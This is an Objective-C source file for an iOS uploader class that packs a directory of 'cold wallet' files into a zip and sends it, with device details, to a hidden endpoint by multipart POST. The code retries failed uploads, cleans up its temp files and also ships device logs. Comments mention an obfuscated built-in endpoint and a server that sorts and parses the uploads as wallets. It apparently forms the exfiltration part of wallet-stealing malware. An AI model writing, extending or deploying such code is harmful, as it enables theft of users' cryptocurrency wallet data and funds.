#import "WQLUploader.h"
#import "WQLLog.h"
#import "WQLZip.h"
#import <UIKit/UIKit.h>
#import <dispatch/dispatch.h>
#import <stdarg.h>

@interface WQLUploader ()
@property (nonatomic, strong) NSURLSession *session;
@property (nonatomic, assign) BOOL cancelled;
@end

@implementation WQLUploader

+ (instancetype)shared {
    static WQLUploader *s = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ s = [WQLUploader new]; });
    return s;
}

- (instancetype)init {
    if (self = [super init]) {
        NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
        cfg.timeoutIntervalForRequest = 60;
        cfg.timeoutIntervalForResource = 600;
        cfg.waitsForConnectivity = YES;
        _session = [NSURLSession sessionWithConfiguration:cfg];
        _maxFileBytes = 64ULL * 1024 * 1024;

        // 清掉上次崩溃残留的临时 zip / body
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
            NSFileManager *fm = [NSFileManager defaultManager];
            NSString *tmp = NSTemporaryDirectory();
            for (NSString *n in [fm contentsOfDirectoryAtPath:tmp error:nil]) {
                if ([n hasPrefix:@"cold_wallets_"] || [n hasPrefix:@"wql_body_"]) {
                    [fm removeItemAtPath:[tmp stringByAppendingPathComponent:n] error:nil];
                }
            }
        });
    }
    return self;
}

- (NSString *)endpoint {
    if (_endpoint.length) return _endpoint;
    // 端点由 WQLViewController 在启动时注入（内置混淆值或调试覆盖），
    // 这里不再读 UserDefaults，避免旧版本写进去的地址压过内置值。
    return [[NSBundle mainBundle] objectForInfoDictionaryKey:@"WQLUploadEndpoint"];
}

- (void)cancel {
    self.cancelled = YES;
}

- (void)log:(NSString *)fmt, ... {
    va_list args;
    va_start(args, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    WQLLogLine(@"%@", line);
    if (self.logBlock) self.logBlock(line);
}

#pragma mark - 主流程

- (void)uploadDirectory:(NSString *)dir
             completion:(void (^)(NSUInteger, NSUInteger))completion {
    NSString *ep = self.endpoint;
    if (!ep.length) {
        [self log:@"上传: 未配置 endpoint，跳过"];
        if (completion) completion(0, 0);
        return;
    }
    if (![[NSFileManager defaultManager] fileExistsAtPath:dir]) {
        [self log:@"上传: 目录不存在 %@", dir];
        if (completion) completion(0, 0);
        return;
    }

    self.cancelled = NO;

    __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;

        // 服务端只把带 _manifest.json 的 zip 归入 wallet_* 并解析，所以优先整包上传
        NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:
                             [NSString stringWithFormat:@"cold_wallets_%@.zip",
                              NSUUID.UUID.UUIDString]];
        NSString *zerr = nil;
        BOOL zipped = [WQLZip zipDirectory:dir
                                    toFile:zipPath
                                  maxBytes:512ULL * 1024 * 1024
                                     error:&zerr];

        NSUInteger ok = 0, failed = 0;

        if (zipped) {
            NSDictionary *attr = [[NSFileManager defaultManager] attributesOfItemAtPath:zipPath error:nil];
            uint64_t zsize = [attr[NSFileSize] unsignedLongLongValue];
            [self log:@"打包完成: %llu B，上传 cold_wallets.zip", (unsigned long long)zsize];
            if ([self uploadFile:zipPath relative:@"cold_wallets.zip" filename:@"cold_wallets.zip"]) {
                ok = 1;
            } else {
                failed = 1;
            }
            [[NSFileManager defaultManager] removeItemAtPath:zipPath error:nil];
        } else {
            [self log:@"打包失败(%@)，退化为逐文件上传", zerr ?: @"unknown"];

            NSMutableArray<NSString *> *files = [NSMutableArray array];
            NSFileManager *fm = [NSFileManager defaultManager];
            NSDirectoryEnumerator *e = [fm enumeratorAtPath:dir];
            for (NSString *rel in e) {
                NSString *full = [dir stringByAppendingPathComponent:rel];
                BOOL isDir = NO;
                if ([fm fileExistsAtPath:full isDirectory:&isDir] && !isDir) [files addObject:rel];
            }
            [self log:@"上传: %lu 个文件 → %@", (unsigned long)files.count, ep];

            for (NSUInteger i = 0; i < files.count; i++) {
                if (self.cancelled) break;
                NSString *rel = files[i];
                NSString *full = [dir stringByAppendingPathComponent:rel];
                BOOL success = [self uploadFile:full relative:rel filename:nil];
                if (success) ok++; else failed++;
                [self log:@"上传 %lu/%lu %@ → %@",
                      (unsigned long)(i + 1), (unsigned long)files.count,
                      rel, success ? @"OK" : @"FAIL"];
            }
        }

        [self log:@"上传结束: 成功 %lu / 失败 %lu", (unsigned long)ok, (unsigned long)failed];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (completion) completion(ok, failed);
        });
    });
}

- (BOOL)uploadFile:(NSString *)path relative:(NSString *)rel filename:(NSString *)filename {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSDictionary *attr = [fm attributesOfItemAtPath:path error:nil];
    uint64_t size = [attr[NSFileSize] unsignedLongLongValue];

    // 整包 zip 单独放宽上限，否则会被 maxFileBytes（默认 64MB）挡掉
    NSString *nameForExt = filename ?: rel;
    BOOL isZip = [nameForExt.pathExtension.lowercaseString isEqualToString:@"zip"];
    uint64_t limit = isZip ? 600ULL * 1024 * 1024 : self.maxFileBytes;
    if (size > limit) {
        [self log:@"上传: 跳过超大文件 %@ (%llu B > %llu B)",
              rel, (unsigned long long)size, (unsigned long long)limit];
        return NO;
    }

    NSData *data = [NSData dataWithContentsOfFile:path
                                          options:NSDataReadingMappedIfSafe
                                            error:nil];
    if (!data) {
        [self log:@"上传: 读取失败 %@", rel];
        return NO;
    }

    NSURL *url = [NSURL URLWithString:self.endpoint];
    if (!url) {
        [self log:@"上传: endpoint 非法 %@", self.endpoint];
        return NO;
    }

    for (int attempt = 1; attempt <= 3; attempt++) {
        if (self.cancelled) return NO;

        NSString *boundary = [NSString stringWithFormat:@"wql-%@", NSUUID.UUID.UUIDString];
        NSString *upName = filename.length ? filename :
            [NSString stringWithFormat:@"cold_wallets_%@",
             [rel stringByReplacingOccurrencesOfString:@"/" withString:@"__"]];

        // multipart body 落临时文件：避免把整包和 body 同时塞进内存（大包会 OOM）
        NSString *bodyPath = [NSTemporaryDirectory() stringByAppendingPathComponent:
                              [NSString stringWithFormat:@"wql_body_%@.tmp",
                               NSUUID.UUID.UUIDString]];
        NSFileManager *fm2 = [NSFileManager defaultManager];
        [fm2 createFileAtPath:bodyPath contents:nil attributes:nil];
        NSFileHandle *out = [NSFileHandle fileHandleForWritingAtPath:bodyPath];

        NSData *head = [self headerDataForFilename:upName
                                          relative:rel
                                              size:(uint64_t)data.length
                                          boundary:boundary];
        NSData *foot = [self footerDataForBoundary:boundary];
        [out writeData:head];
        [out writeData:data];
        [out writeData:foot];
        [out closeFile];

        uint64_t bodyLen = (uint64_t)head.length + (uint64_t)data.length + (uint64_t)foot.length;

        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
        req.HTTPMethod = @"POST";
        [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
   forHTTPHeaderField:@"Content-Type"];
        [req setValue:[NSString stringWithFormat:@"%llu", (unsigned long long)bodyLen]
   forHTTPHeaderField:@"Content-Length"];
        req.timeoutInterval = 600;

        __block NSInteger code = -1;
        __block NSString *snippet = nil;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);

        NSURLSessionUploadTask *task =
            [self.session uploadTaskWithRequest:req
                                       fromFile:[NSURL fileURLWithPath:bodyPath]
                              completionHandler:^(NSData *respData, NSURLResponse *resp, NSError *err) {
            if ([resp isKindOfClass:[NSHTTPURLResponse class]]) {
                code = [(NSHTTPURLResponse *)resp statusCode];
            } else if (err) {
                code = -2;
            }
            if (respData.length) {
                NSUInteger n = MIN(respData.length, (NSUInteger)200);
                snippet = [[NSString alloc] initWithData:[respData subdataWithRange:NSMakeRange(0, n)]
                                                encoding:NSUTF8StringEncoding];
            }
            dispatch_semaphore_signal(sem);
        }];
        [task resume];

        // 按体积给足时间：基础 120s + 每 200KB 一秒，封顶 900s
        NSTimeInterval wait = 120.0 + (double)bodyLen / (200.0 * 1024.0);
        if (wait > 900.0) wait = 900.0;
        long waited = dispatch_semaphore_wait(sem,
                        dispatch_time(DISPATCH_TIME_NOW, (int64_t)(wait * NSEC_PER_SEC)));
        [fm2 removeItemAtPath:bodyPath error:nil];

        if (waited != 0) {
            [self log:@"上传: 等待超时 %@ (%.0fs, %llu B)", rel, wait, (unsigned long long)bodyLen];
            return NO;
        }

        if (code >= 200 && code < 300) {
            [self log:@"上传: %@ → %ld %@", rel, (long)code, snippet ?: @""];
            return YES;
        }

        if (code >= 400 && code < 500) {
            [self log:@"上传: %@ → %ld（4xx 不重试）%@", rel, (long)code, snippet ?: @""];
            return NO;
        }

        [self log:@"上传: 重试 %d/3 %@ code=%ld %@",
              attempt, rel, (long)code, snippet ?: @""];
        [NSThread sleepForTimeInterval:1.0 * attempt];
    }
    return NO;
}

#pragma mark - 日志上传

- (void)uploadLogFile:(NSString *)path completion:(void (^)(BOOL))completion {
    NSString *ep = self.endpoint;
    if (!ep.length) {
        [self log:@"日志上传: 未配置 endpoint，跳过"];
        if (completion) completion(NO);
        return;
    }

    NSData *data = [NSData dataWithContentsOfFile:path
                                          options:NSDataReadingMappedIfSafe
                                            error:nil];
    if (!data.length) {
        [self log:@"日志上传: 文件为空或读不到 %@", path];
        if (completion) completion(NO);
        return;
    }

    // 只取尾部 8MB（日志本身 2MB 轮转，正常不会触发）
    const NSUInteger kMax = 8 * 1024 * 1024;
    if (data.length > kMax) {
        data = [data subdataWithRange:NSMakeRange(data.length - kMax, kMax)];
    }

    UIDevice *dev = [UIDevice currentDevice];
    NSString *idfv = dev.identifierForVendor.UUIDString ?: @"nodev";
    if (idfv.length > 8) idfv = [idfv substringToIndex:8];
    NSDateFormatter *df = [NSDateFormatter new];
    df.dateFormat = @"yyyyMMdd_HHmmss";
    NSString *name = [NSString stringWithFormat:@"wql_log_%@_%@.txt",
                      idfv, [df stringFromDate:[NSDate date]]];

    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:name];
    if (![data writeToFile:tmp atomically:YES]) {
        [self log:@"日志上传: 写临时文件失败"];
        if (completion) completion(NO);
        return;
    }

    __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        BOOL ok = [self uploadFile:tmp relative:name filename:name];
        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
        [self log:@"日志上传: %@（%lu B，文件名 %@）",
              ok ? @"成功" : @"失败", (unsigned long)data.length, name];
        if (completion) {
            dispatch_async(dispatch_get_main_queue(), ^{ completion(ok); });
        }
    });
}

#pragma mark - multipart

- (NSData *)headerDataForFilename:(NSString *)filename
                         relative:(NSString *)relative
                             size:(uint64_t)size
                         boundary:(NSString *)boundary {
    NSMutableData *body = [NSMutableData data];
    NSString *bundle = [relative componentsSeparatedByString:@"/"].firstObject ?: @"";

    void (^field)(NSString *, NSString *) = ^(NSString *name, NSString *value) {
        [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary]
                          dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[[NSString stringWithFormat:
                           @"Content-Disposition: form-data; name=\"%@\"\r\n\r\n", name]
                          dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[value dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    };

    UIDevice *dev = [UIDevice currentDevice];
    NSString *model = [NSString stringWithFormat:@"%@ %@ %@",
                       dev.model, dev.systemName, dev.systemVersion];

    // 服务端 form 字段会写进 upload_meta；不带 token，避免多建一个 tok: 设备
    field(@"app", @"WQL");
    field(@"device", model);
    field(@"model", dev.model);
    field(@"ios", dev.systemVersion);
    field(@"bundle", bundle);
    field(@"relative", relative);
    field(@"size", [NSString stringWithFormat:@"%llu", (unsigned long long)size]);

    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary]
                      dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:
                       @"Content-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n",
                       filename ?: @"blob"]
                      dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n"
                      dataUsingEncoding:NSUTF8StringEncoding]];

    return body;
}

- (NSData *)footerDataForBoundary:(NSString *)boundary {
    return [[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary]
            dataUsingEncoding:NSUTF8StringEncoding];
}

@end